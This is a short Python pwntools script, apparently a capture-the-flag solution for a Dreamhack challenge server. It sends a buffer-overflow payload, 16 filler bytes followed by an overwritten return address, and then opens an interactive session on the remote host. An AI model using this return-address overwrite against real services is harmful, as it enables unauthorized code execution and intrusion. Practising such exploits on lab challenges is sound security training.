from pwn import *
context.log_level='debug'

host = 'host1.dreamhack.games'
port = 15805

p = remote(host,port)

test = 0x004010ba
bin_sh = 0x00402000

payload = b'\x90'*0x10
payload += p64(test)

p.sendlineafter('Signal:',payload)


p.interactive()
